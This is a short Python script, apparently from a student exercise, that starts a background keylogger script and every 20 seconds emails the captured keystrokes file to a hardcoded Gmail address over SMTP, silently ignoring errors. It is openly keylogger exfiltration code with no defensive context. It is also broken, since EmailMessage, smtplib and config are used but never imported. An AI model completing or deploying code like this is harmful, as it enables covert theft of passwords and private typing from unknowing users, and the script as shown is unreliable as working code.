#!/usr/bin/env python3 

import requests 
import time 
import os 
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py &") 
time.sleep(1)

def send_request():
	with open('keyboard_Input.txt') as msgcontent:
		msg = EmailMessage()
		msg.set_content(msgcontent.read())
	try: 
		msg['Subject'] = f'The contents of {"keyboard_Input.txt"}'
		msg['From'] = 'sccomtois@gmail.com'
		msg['To'] = 'sccomtois@gmail.com'
		server = smtplib.SMTP('smtp.gmail.com:587')
		server.ehlo()
		server.starttls()
		server.login(config.EMAIL_ADDRESS, config.PASSWORD)
		server.send_message(msg)
		server.quit()
	except:
		pass

def interval():
	global startlog 
	if time.time() - 20 > startlog: 
#		print('its been 20 secs') 
		send_request() 
		startlog = time.time()

counter = 0 
while True: 
	counter += 1 
#	print(counter) 
	interval() 
	time.sleep(1)

